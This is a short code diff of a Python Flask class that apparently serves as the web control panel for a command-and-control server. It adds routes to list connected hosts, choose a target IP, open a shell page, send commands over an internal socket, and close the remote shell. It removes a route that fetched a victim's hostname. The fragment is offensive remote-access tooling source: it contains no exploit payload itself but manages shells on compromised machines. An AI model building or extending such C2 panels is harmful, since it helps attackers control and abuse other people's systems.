@@ -19,10 +19,12 @@ class FlskSevrev(object):
         
 
     def getshell(self,hostname):
+        self.choseTarget(hostname)
         return render_template('index.html',hostname=hostname)
     
     def choseTarget(self,targetIp):
-        self.c2Server.connected = targetIp
+        self.c2Server.connectTo = targetIp
+
 
     def listConnections(self):
         return self.c2Server.connections
@@ -37,20 +39,14 @@ class FlskSevrev(object):
         msg = self._internalSock._read_msg().decode(errors='replace')
         return {'message': msg}
     
-    def getConnectedHostname(self):
-        self._internalSock._send_msg(b'hostname')
-        host = self._internalSock._read_msg().decode(errors='replace')
-        return f"{host}: admin"
+    def closeShell(self):
+        self._internalSock._send_msg('exit')
+
     
     def _ruleResetor(self):
         self.app.add_url_rule('/', 'homePage', self.homePage)
         self.app.add_url_rule('/listConnections', 'listConnections', self.listConnections)
         self.app.add_url_rule('/getshell/<hostname>', 'getshell', self.getshell)
         self.app.add_url_rule('/send_message', 'send_message', self.send_message, methods=['POST'])
-        self.app.add_url_rule(
-            '/getConnectedHostname', 
-            'getConnectedHostname', 
-            self.getConnectedHostname, 
-        )
-    
+        self.app.add_url_rule('/closeShell', 'closeShell', self.closeShell)
 
